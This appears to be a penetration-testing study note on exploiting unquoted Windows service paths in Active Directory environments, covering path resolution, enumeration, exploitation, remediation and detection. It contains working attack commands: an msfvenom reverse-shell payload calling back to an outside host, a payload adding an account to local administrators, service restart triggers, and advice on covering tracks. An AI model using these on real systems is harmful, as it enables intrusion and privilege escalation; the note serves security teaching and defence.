---
tags: [active-directory, intermediate, privesc, vapt]
difficulty: intermediate
module: "69 - AD Access Controls and Escalation Basics"
topic: "69.07 Unquoted Service Paths"
---

# Unquoted Service Paths in AD Environments

## 1. Introduction and Executive Summary

In the realm of Windows Privilege Escalation, "Unquoted Service Paths" is a ubiquitous and frequently encountered misconfiguration. This vulnerability arises not from an architectural flaw in the operating system itself, but rather from a combination of poor software development practices and the deterministic way the Windows API resolves file paths containing spaces. 

When a service is created in Windows, its configuration includes a binary path (`binPath` or `ImagePath`) that points to the executable file. If this path contains spaces and is not properly enclosed in double quotation marks, the Windows function `CreateProcess` attempts to resolve the path by systematically parsing the string at every space, appending `.exe` to each segment, and searching for a matching executable. 

If an attacker has write permissions to any of the directories along this resolution path, they can plant a maliciously crafted executable. When the service starts, the system will execute the attacker's binary instead of the legitimate service application. Because services typically run as highly privileged accounts (e.g., `NT AUTHORITY\SYSTEM`), this results in an immediate local privilege escalation (LPE). In large Active Directory environments, enterprise software deployment often propagates these vulnerable services across thousands of endpoints, creating massive attack surfaces.

## 2. The Mechanics of Windows Path Resolution

To understand the exploit, one must examine the `CreateProcess` API. According to Microsoft's documentation, if the application name is not explicitly passed to `CreateProcess` (or if it's passed as part of the command line string without quotes), the system must guess where the executable path ends and where the command-line arguments begin.

Consider the following unquoted `binPath`:
`C:\Program Files\Enterprise Software\Monitoring Agent\agent.exe`

Because there are spaces in the path and no surrounding quotation marks, Windows attempts to execute the following files in exactly this order:

1. `C:\Program.exe`
2. `C:\Program Files\Enterprise.exe`
3. `C:\Program Files\Enterprise Software\Monitoring.exe`
4. `C:\Program Files\Enterprise Software\Monitoring Agent\agent.exe` (The actual intended executable)

The operating system checks for the existence of each `.exe` file sequentially. If `C:\Program Files\Enterprise.exe` exists, the system will execute it and stop processing the rest of the path. Whatever follows the executed file (e.g., `Software\Monitoring Agent\agent.exe`) is passed to the executable as command-line arguments.

## 3. Vulnerability Prerequisites

For an Unquoted Service Path vulnerability to be exploitable, two strict conditions must be met simultaneously:
1. **The unquoted path must contain at least one space.** A path like `C:\Tools\Service\svc.exe`, even if unquoted, is not vulnerable because there are no spaces to cause resolution ambiguity.
2. **The attacker must have write permissions to one of the directories in the path resolution sequence.** For example, the attacker must be able to write an executable to `C:\` (to create `Program.exe`), or to `C:\Program Files\` (to create `Enterprise.exe`).

By default, standard users do not have write access to the root `C:\` drive or `C:\Program Files\`. However, administrators often misconfigure folder permissions, or third-party software creates custom directories (e.g., `C:\Custom Apps\Vulnerable Service\`) with overly permissive Access Control Lists (ACLs) that grant `BUILTIN\Users` or `Authenticated Users` write access.

## 4. Attack Flow Visualization

Below is an ASCII diagram depicting the flow of an Unquoted Service Path attack:

```text
+-------------------------------------------------------------------------+
|                        WINDOWS SERVICE STARTUP                          |
|  Target binPath: C:\My Apps\Custom Tools\service.exe                    |
|  Quotes Present: NO                                                     |
+-------------------------------------------------------------------------+
                                    |
                                    v
+-------------------------------------------------------------------------+
| SCM calls CreateProcess API to launch the service                       |
+-------------------------------------------------------------------------+
                                    |
                                    v
+-----------------------------------+   YES +-----------------------------+
| Does C:\My.exe exist?             | ----> | EXECUTE C:\My.exe           |
+-----------------------------------+       | (Attacker Payload runs as   |
| NO                                |       |  SYSTEM!)                   |
+-----------------------------------+       +-----------------------------+
                                    |
                                    v
+-----------------------------------+   YES +-----------------------------+
| Does C:\My Apps\Custom.exe exist? | ----> | EXECUTE Custom.exe          |
+-----------------------------------+       | (Attacker Payload runs as   |
| NO                                |       |  SYSTEM!)                   |
+-----------------------------------+       +-----------------------------+
                                    |
                                    v
+-----------------------------------+       +-----------------------------+
| Does C:\My Apps\Custom Tools\     |       | EXECUTE service.exe         |
| service.exe exist?                | ----> | (Legitimate Service starts) |
+-----------------------------------+       +-----------------------------+
```

## 5. Enumeration and Discovery

Discovering unquoted service paths requires checking the registry or utilizing WMI/PowerShell to parse service configurations.

### 5.1 Using WMI (Native Command Line)
You can query all services using WMI and filter for paths that are not enclosed in quotes and do not reside in the `system32` directory.

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
*Note: This basic WMI filter highlights paths without quotes. Manual inspection is still required to ensure spaces exist in the path.*

### 5.2 Using PowerShell
A more precise PowerShell one-liner to find vulnerable paths:

```powershell
Get-WmiObject win32_service | Where-Object {
    $_.PathName -notmatch '^"' -and 
    $_.PathName -match ' ' -and 
    $_.PathName -notmatch 'C:\\Windows'
} | Select-Object Name, DisplayName, PathName
```

### 5.3 Automated Enumeration Tools
Tools like PowerUp and WinPEAS automate this discovery process and also check for folder write permissions.

**PowerUp:**
```powershell
Invoke-AllChecks
# Or specifically:
Get-UnquotedService -Verbose
```

**WinPEAS:**
```cmd
winpeas.exe quiet servicesinfo
```

### 5.4 Checking Folder Permissions
Once a vulnerable path is found, the next step is verifying write permissions in the target directory using `icacls` or `accesschk`.

Assume the path is `C:\Custom Software\Agent Dir\agent.exe`. We need to check if we can write `Custom.exe` in `C:\Custom Software\`.

```cmd
icacls "C:\Custom Software"
```
Look for `(W)` (Write), `(M)` (Modify), or `(F)` (Full Control) granted to groups like `BUILTIN\Users` or `NT AUTHORITY\Authenticated Users`.

## 6. Exploitation Methodology

Let us assume the target service has the path `C:\Enterprise Apps\Monitoring Tool\monitor.exe` and runs as SYSTEM. We discovered that the group `Authenticated Users` has write access to `C:\Enterprise Apps\`.

### 6.1 Crafting the Payload
The payload must be an executable named `Monitoring.exe` so that Windows resolves it before reaching `Monitoring Tool\monitor.exe`.

We can use `msfvenom` to generate a reverse shell payload:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o Monitoring.exe
```

*Alternatively, we could write a simple C program that executes `net localgroup administrators attacker /add` and compile it into an executable.*

### 6.2 Planting the Payload
Transfer the payload to the victim machine and place it in the vulnerable directory.

```cmd
copy Monitoring.exe "C:\Enterprise Apps\Monitoring.exe"
```

### 6.3 Triggering the Execution
To execute the payload, the service must be started or restarted. If the standard user has the required privileges (`SERVICE_START` and `SERVICE_STOP`), they can do it manually.

```cmd
sc stop VulnerableService
sc start VulnerableService
```

If the user cannot restart the service manually, but the service is set to `AUTO_START`, the attacker simply reboots the machine (if they have reboot privileges) or waits for the next natural system reboot.

When the system boots up, the SCM attempts to start the service. It reads `C:\Enterprise Apps\Monitoring Tool\monitor.exe`, parsing it space by space. It finds `C:\Enterprise Apps\Monitoring.exe`, successfully executes our reverse shell, and grants us SYSTEM privileges.

## 7. Post-Exploitation and Considerations

Like weak service permissions, an unquoted service path exploit will eventually cause the SCM to throw an error (Error 1053) because the malicious executable does not correctly interface with the Windows Service APIs. Once the payload executes, the legitimate service will *not* start, which might alert system administrators or cause functionality loss.

To maintain stealth and stability:
1. The payload should ideally spawn a new thread or process for the reverse shell, and then immediately terminate.
2. The attacker must rename or delete the malicious `Monitoring.exe` after gaining access.
3. The attacker should manually start the legitimate service using its true path, so normal operations resume.

## 8. Remediation and Defense

Fixing this vulnerability is highly straightforward and should be incorporated into standard deployment pipelines.

1. **Quote All Paths:** Ensure that the `ImagePath` parameter in the registry is wrapped in double quotes.
   ```cmd
   sc config VulnerableService binpath= "\"C:\Enterprise Apps\Monitoring Tool\monitor.exe\""
   ```
2. **Registry Editing:** Alternatively, administrators can directly edit `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>\ImagePath` via `regedit` or Group Policy Preferences to add the quotes.
3. **Strict Directory Permissions:** Follow the principle of least privilege. Do not grant standard users write access to directories at the root of `C:\` or custom application directories. Only Administrators and SYSTEM should have write access to software installation paths.
4. **Software Development Best Practices:** Developers creating MSI installers or custom services must ensure that the installation routines explicitly encapsulate paths in quotes during service registration.

## 9. Detection Mechanisms

- **File System Monitoring (FIM):** Alert on the creation of `.exe` files in the root of `C:\` or in the first level of directories like `C:\Program Files\`, especially names matching common directory segments (e.g., `Program.exe`, `Enterprise.exe`).
- **Sysmon Process Creation (Event ID 1):** Monitor for processes where the original command line lacks quotes but contains spaces, resulting in an executable launching from an unexpected directory (e.g., `C:\Program.exe`).
- **Service Control Errors (Event ID 7000 / 7009):** Repeated service timeout errors can indicate a failed unquoted path exploit where the malicious payload hung the startup process.

## Real-World Attack Scenario

An attacker gained a low-privileged foothold on an enterprise application server (`SRV-APP-09`) belonging to a financial institution. Their goal was to achieve SYSTEM privileges to access sensitive database connection strings stored in protected registry keys.

Running a quick WMI query, the attacker hunted for unquoted service paths:
`wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """`

The query highlighted a custom monitoring solution:
`C:\Enterprise Software\Server Agent\agent_service.exe`

The path lacked surrounding quotes and contained spaces. The attacker recognized that Windows would sequentially attempt to execute `C:\Enterprise.exe` and `C:\Enterprise Software\Server.exe` before finding the true executable.

**The Execution:**
1. The attacker needed to check if they could write to `C:\` or `C:\Enterprise Software\`. Using `icacls "C:\Enterprise Software"`, they discovered that the folder had been misconfigured during manual deployment, granting `BUILTIN\Users` the `(W)` (Write) permission.
2. Knowing the resolution order, the attacker compiled a simple C payload that executed `net localgroup administrators jdoe /add` and named it `Server.exe`.
3. They uploaded `Server.exe` and placed it precisely at `C:\Enterprise Software\Server.exe`.
4. The target service was highly critical and configured to auto-restart upon failure. The attacker intentionally crashed the legitimate `agent_service.exe` process by flooding its open port.
5. The Service Control Manager detected the crash and immediately attempted to restart the service.
6. As the SCM parsed the unquoted path, it found `C:\Enterprise Software\Server.exe` and executed it as `NT AUTHORITY\SYSTEM`.

**The Outcome:**
The attacker's user account (`jdoe`) was silently added to the local Administrators group. They then logged back in with elevated privileges, bypassed UAC, and dumped the necessary database credentials. To cover their tracks, they deleted `Server.exe` and restarted the service properly.

## 10. Chaining Opportunities

- **GPP / Software Deployment Exploitation:** In AD environments, poorly configured GPOs used to deploy MSIs often create unquoted paths. Attackers can map out widespread vulnerabilities across hundreds of servers.
- **Defense Evasion:** By hijacking a legitimate, signed service's execution path, the initial execution of the payload might bypass some basic behavioral checks, as the SCM is a trusted initiator.
- **Persistence:** This vector provides robust persistence. Even if an administrator kills the malicious process, the attacker retains execution every time the machine reboots or the service restarts, provided the malicious binary remains in place.

## 11. Related Notes
- [[06 - Exploiting Weak Service Permissions]]
- [[10 - DLL Hijacking Basics for Privilege Escalation]]
- [[08 - AlwaysInstallElevated Abuse]]
- [[01 - Local Privilege Escalation Fundamentals]]
- [[04 - Enumerating Windows Local Host Misconfigurations]]

Unquoted Service Paths represent a low-hanging fruit in penetration testing. Their presence often indicates broader systemic issues with software deployment standards and access control management within the targeted infrastructure.
